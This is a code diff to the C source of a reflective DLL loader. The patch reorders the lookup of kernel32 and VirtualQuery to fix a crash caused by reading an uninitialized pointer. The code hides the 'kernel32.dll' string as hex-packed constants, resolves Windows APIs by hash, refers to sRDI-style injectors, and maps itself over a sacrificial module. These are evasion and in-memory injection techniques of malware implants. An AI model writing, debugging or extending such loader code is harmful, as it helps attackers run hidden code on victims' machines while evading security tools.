@@ -320,6 +320,27 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     int k;
     BW_DLLMAIN dllmain;
 
+    /* Resolve kernel32 + VirtualQuery FIRST: the location block below
+     * calls pVQ, and reading it before assignment reads an uninitialized
+     * stack slot (1fe0665 booted-and-died exactly this way - the != NULL
+     * guard is worthless against garbage). Nothing before the PE parse
+     * needs `flat`, so the walk order is free to change. */
+    {
+        unsigned short kname[16];
+        QWORD * kq = (QWORD *)kname;
+        kq[0] = 0x006E00720065006BULL;
+        kq[1] = 0x00320033006C0065ULL;
+        kq[2] = 0x006C006C0064002EULL;
+        kq[3] = 0x0000000000000000ULL;
+        kern = (unsigned long long)bw_find_module(kname);
+    }
+    if (kern == 0)
+        return 0;
+
+    pVQ             = (BW_VQUERY)    bw_find_export_hash((void *)kern, BW_H_VIRTUALQUERY);
+    if (pVQ == NULL)
+        return 0;
+
     /* this function runs FROM the wall (.text). Locate the image that owns
      * us: every real execution context (injectors, sRDI-style hosts, our
      * append-template) copies the flat image into its own VirtualAlloc and
@@ -336,7 +357,7 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
         QWORD pc = (QWORD)(DWORD_PTR)&ReflectiveLoader;
         MEMORY_BASIC_INFORMATION mbi;
         flat = NULL;
-        if (pVQ != NULL && pVQ((LPCVOID)(pc & ~0xFFFULL), &mbi, sizeof(mbi)) != 0
+        if (pVQ((LPCVOID)(pc & ~0xFFFULL), &mbi, sizeof(mbi)) != 0
             && mbi.AllocationBase != NULL)
             flat = (unsigned char *)mbi.AllocationBase;
         if (flat == NULL) {
@@ -362,29 +383,16 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     sec = (IMG_SECTION *)(nth + 24 + szopt);
     size_of_image = opt->SizeOfImage;
 
-    {
-        unsigned short kname[16];
-        QWORD * kq = (QWORD *)kname;
-        kq[0] = 0x006E00720065006BULL;
-        kq[1] = 0x00320033006C0065ULL;
-        kq[2] = 0x006C006C0064002EULL;
-        kq[3] = 0x0000000000000000ULL;
-        kern = (unsigned long long)bw_find_module(kname);
-    }
-    if (kern == 0)
-        return 0;
-
     pLoadLibraryA   = (BW_LOADLIBA)  bw_find_export_hash((void *)kern, BW_H_LOADLIBRARYA);
     pGetProcAddress = (BW_GETPROC)   bw_find_export_hash((void *)kern, BW_H_GETPROCADDR);
     pVP             = (BW_VPROT)     bw_find_export_hash((void *)kern, BW_H_VIRTUALPROT);
-    pVQ             = (BW_VQUERY)    bw_find_export_hash((void *)kern, BW_H_VIRTUALQUERY);
     pLLW            = (BW_LOADLIBEXW)bw_find_export_hash((void *)kern, BW_H_LOADLIBEXW);
     pFL             = (BW_FREELIB)   bw_find_export_hash((void *)kern, BW_H_FREELIBRARY);
     pET             = (BW_EXITTHR)   bw_find_export_hash((void *)kern, BW_H_EXITTHREAD);
     pFlush          = (BW_FLUSH)     bw_find_export_hash((void *)kern, BW_H_FLUSHICACHE);
     pGetCur         = (BW_GETCUR)    bw_find_export_hash((void *)kern, BW_H_GETCURPROC);
     if (pLoadLibraryA == NULL || pGetProcAddress == NULL || pVP == NULL ||
-        pVQ == NULL || pLLW == NULL)
+        pLLW == NULL)
         return 0;
 
     /* Map at the sacrificial HMODULE, not at its .text. RtlPcToFileHeader /
